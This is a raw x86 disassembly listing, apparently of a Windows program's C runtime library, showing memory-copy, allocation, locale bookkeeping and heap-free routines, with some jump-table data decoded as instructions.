  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
